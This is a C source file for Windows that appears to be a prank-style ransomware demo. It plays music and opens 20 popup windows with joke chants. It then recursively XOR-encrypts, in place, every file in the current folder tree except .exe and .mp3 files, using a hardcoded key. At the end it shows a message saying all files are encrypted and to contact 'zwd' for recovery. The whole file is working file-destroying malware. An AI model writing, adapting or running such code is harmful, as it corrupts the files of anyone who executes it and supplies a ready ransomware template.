#include <stdio.h>
#include <Windows.h>
#include <string.h>
#include <mmsystem.h>
#include <stdlib.h>
#include <process.h>
#include <time.h>
#include <tchar.h> 
#pragma comment(lib,"winmm.lib")

void travelPath(char* pathName);
void encryptFile(char* filePath, const char* key);
BOOL shouldEncryptFile(char* filePath);

// 加密密钥
const char* ENCRYPT_KEY = "PassionInnovationCooperation";
const int KEY_LENGTH = (int)strlen(ENCRYPT_KEY);

// 创建窗口
void CreateFullScreenWindows();

// 全局变量
int g_screenWidth, g_screenHeight;

int main() {
    char buff[MAX_PATH];
    char exePath[MAX_PATH];

    // 获取屏幕尺寸
    g_screenWidth = GetSystemMetrics(SM_CXSCREEN);
    g_screenHeight = GetSystemMetrics(SM_CYSCREEN);

    srand((unsigned int)time(NULL));  // 初始化随机种子

    printf("屏幕尺寸: %dx%d\n", g_screenWidth, g_screenHeight);

    // 播放音乐
    mciSendStringA("open .\\taffy.mp3 alias bgm", NULL, 0, NULL);
    mciSendStringA("play bgm repeat", NULL, 0, NULL);

    // 创建满屏窗口（20个）
    CreateFullScreenWindows();

    // 获取当前文件夹和程序路径
    GetCurrentDirectoryA(MAX_PATH, buff);
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    printf("当前文件夹: %s\n", buff);
    printf("程序路径: %s\n", exePath);
    printf("开始加密...\n");

    travelPath(buff);

    printf("加密完成！\n");

    // 最后一个窗口
    MessageBox(NULL, TEXT("文件加密完成！\n所有文件已被加密！\n如需恢复请联系zwd..."),
        TEXT("⚠️ 加密完成 ⚠️"), MB_ICONWARNING | MB_OK);

    system("pause");
    return 0;
}

// 一次性创建20个满屏窗口
void CreateFullScreenWindows() {
    // 窗口标题
    const TCHAR* titles[] = {
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!"),
        TEXT("SIPC OPEN THE DOOR!!!")
    };

    // 窗口内容
    const TCHAR* messages[] = {
        TEXT("圣火昭昭，圣火耀耀！"),
        TEXT("凡我弟子，喵喵喵喵！"),
        TEXT("圣火昭昭，圣火耀耀！"),
        TEXT("凡我弟子，喵喵喵喵！"),
        TEXT("圣火昭昭，圣火耀耀！"),
        TEXT("凡我弟子，喵喵喵喵！"),
        TEXT("圣火昭昭，圣火耀耀！"),
        TEXT("凡我弟子，喵喵喵喵！"),
        TEXT("圣火昭昭，圣火耀耀！"),
        TEXT("凡我弟子，喵喵喵喵！"),
        TEXT("圣火昭昭，圣火耀耀！"),
        TEXT("凡我弟子，喵喵喵喵！"),
        TEXT("圣火昭昭，圣火耀耀！"),
        TEXT("凡我弟子，喵喵喵喵！"),
        TEXT("圣火昭昭，圣火耀耀！"),
        TEXT("凡我弟子，喵喵喵喵！"),
        TEXT("圣火昭昭，圣火耀耀！"),
        TEXT("凡我弟子，喵喵喵喵！"),
        TEXT("圣火昭昭，圣火耀耀！"),
        TEXT("凡我弟子，喵喵喵喵！")
    };

    // 一次性创建20个窗口，覆盖整个屏幕
    HWND windows[20];

    for (int i = 0; i < 20; i++) {
        // 计算网格位置
        int row = i / 4;
        int col = i % 4;

        // 计算窗口位置和大小，覆盖整个屏幕
        int cellWidth = g_screenWidth / 4;
        int cellHeight = g_screenHeight / 5;

        int x = col * cellWidth + rand() % 50 - 25;  // 稍微随机偏移
        int y = row * cellHeight + rand() % 50 - 25;
        int width = cellWidth + rand() % 100 - 50;
        int height = cellHeight + rand() % 100 - 50;

        // 确保窗口在屏幕内
        if (x < 0) x = 0;
        if (y < 0) y = 0;
        if (x + width > g_screenWidth) width = g_screenWidth - x;
        if (y + height > g_screenHeight) height = g_screenHeight - y;

        // 创建标题文本
        TCHAR titleText[100];
        _stprintf_s(titleText, 100, TEXT("%s [%d/20]"), titles[i], i + 1);

        // 随机样式
        DWORD style = WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_VISIBLE;

        // 创建窗口
        windows[i] = CreateWindow(
            TEXT("BUTTON"), titleText,
            style,
            x, y, width, height,
            NULL, NULL, GetModuleHandle(NULL), NULL
        );

        if (windows[i]) {
            // 随机背景色
            COLORREF bgColor = RGB(rand() % 100 + 150, rand() % 100, rand() % 100);
            HBRUSH hBrush = CreateSolidBrush(bgColor);
            SetClassLongPtr(windows[i], GCLP_HBRBACKGROUND, (LONG_PTR)hBrush);

            // 创建静态文本控件
            HWND hStatic = CreateWindow(
                TEXT("STATIC"), messages[i],
                WS_CHILD | WS_VISIBLE | SS_CENTER,
                10, 30, width - 20, height - 80,
                windows[i], NULL, GetModuleHandle(NULL), NULL
            );

            // 使用大号字体
            HFONT hFont = CreateFont(
                24 + rand() % 12, 0, 0, 0,
                FW_BOLD,  // 粗体
                rand() % 2,  // 随机斜体
                0, 0,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE,
                TEXT("微软雅黑")
            );
            SendMessage(hStatic, WM_SETFONT, (WPARAM)hFont, TRUE);

            // 创建确定按钮 - 修复类型转换警告
            HWND hButton = CreateWindow(
                TEXT("BUTTON"), TEXT("确定"),
                WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
                width / 2 - 50, height - 40, 100, 30,
                windows[i], (HMENU)(INT_PTR)(i + 1000), GetModuleHandle(NULL), NULL
            );

            // 随机按钮颜色
            if (rand() % 2) {
                HBRUSH btnBrush = CreateSolidBrush(RGB(255, rand() % 100, rand() % 100));
                SetClassLongPtr(hButton, GCLP_HBRBACKGROUND, (LONG_PTR)btnBrush);
            }

            // 显示窗口
            ShowWindow(windows[i], SW_SHOW);
            UpdateWindow(windows[i]);
        }
    }

    // 消息循环处理所有窗口
    MSG msg;
    int windowsClosed = 0;

    printf("已创建20个窗口覆盖全屏！\n");
    printf("需要关闭所有窗口才能继续...\n");

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        // 检查窗口关闭 - 修复类型转换
        if (msg.message == WM_COMMAND && LOWORD(msg.wParam) >= 1000 && LOWORD(msg.wParam) < 1020) {
            int windowIndex = LOWORD(msg.wParam) - 1000;
            if (windows[windowIndex]) {
                DestroyWindow(windows[windowIndex]);
                windows[windowIndex] = NULL;
                windowsClosed++;

                printf("已关闭窗口 %d/20\n", windowsClosed);

                if (windowsClosed >= 20) {
                    printf("所有窗口已关闭，继续执行加密...\n");
                    break;
                }
            }
        }

        // 检查窗口被其他方式关闭
        for (int i = 0; i < 20; i++) {
            if (windows[i] && !IsWindow(windows[i])) {
                windows[i] = NULL;
                windowsClosed++;
                printf("窗口 %d 已被强制关闭\n", i + 1);
            }
        }

        if (windowsClosed >= 20) {
            printf("所有窗口已关闭，继续执行加密...\n");
            break;
        }
    }
}

void travelPath(char* pathName) {
    char fileName[MAX_PATH] = { 0 };
    sprintf_s(fileName, MAX_PATH, "%s\\*.*", pathName);

    WIN32_FIND_DATAA findData = { 0 };
    HANDLE hFile = FindFirstFileA(fileName, &findData);

    if (INVALID_HANDLE_VALUE == hFile) {
        printf("无法访问文件夹: %s\n", pathName);
        return;
    }

    do {
        if (strcmp(findData.cFileName, ".") == 0 ||
            strcmp(findData.cFileName, "..") == 0) {
            continue;
        }

        char temp[MAX_PATH] = { 0 };
        sprintf_s(temp, MAX_PATH, "%s\\%s", pathName, findData.cFileName);

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            printf("进入文件夹: %s\n", temp);
            travelPath(temp);
        }
        else {
            if (shouldEncryptFile(temp)) {
                printf("加密文件: %s\n", temp);
                encryptFile(temp, ENCRYPT_KEY);
            }
            else {
                printf("跳过文件: %s\n", temp);
            }
        }

    } while (FindNextFileA(hFile, &findData));

    FindClose(hFile);
}

BOOL shouldEncryptFile(char* filePath) {
    char currentExePath[MAX_PATH];
    GetModuleFileNameA(NULL, currentExePath, MAX_PATH);

    printf("检查文件: %s\n", filePath);

    // 跳过程序自身
    if (strcmp(filePath, currentExePath) == 0) {
        printf("  跳过：程序自身\n");
        return FALSE;
    }

    //获取文件扩展名
    char* extension = strrchr(filePath, '.');
    if (extension == NULL) {
        printf("  跳过：无扩展名\n");
        return FALSE;
    }

    printf("  文件扩展名: %s\n", extension);

    //只跳过exe和mp3文件
    const char* skipExtensions[] = {
        ".exe", ".mp3", NULL
    };

    for (int i = 0; skipExtensions[i] != NULL; i++) {
        if (_stricmp(extension, skipExtensions[i]) == 0) {
            printf("  跳过：exe或mp3文件\n");
            return FALSE;
        }
    }

    // 加密其他
    printf("  需要加密：其他文件类型\n");
    return TRUE;
}

void encryptFile(char* filePath, const char* key) {
    FILE* file;
    errno_t err = fopen_s(&file, filePath, "rb+");

    if (err != 0 || file == NULL) {
        printf("无法打开文件: %s\n", filePath);
        return;
    }

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    if (fileSize == 0) {
        printf("  跳过：空文件\n");
        fclose(file);
        return;
    }

    if (fileSize > 100 * 1024 * 1024) {
        printf("  跳过：文件过大 (%ld 字节)\n", fileSize);
        fclose(file);
        return;
    }

    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    if (buffer == NULL) {
        fclose(file);
        printf("内存分配失败\n");
        return;
    }

    fread(buffer, 1, fileSize, file);

    for (long i = 0; i < fileSize; i++) {
        buffer[i] ^= key[i % KEY_LENGTH];
    }

    fseek(file, 0, SEEK_SET);
    fwrite(buffer, 1, fileSize, file);

    free(buffer);
    fclose(file);

    printf("  已加密: %ld 字节\n", fileSize);
}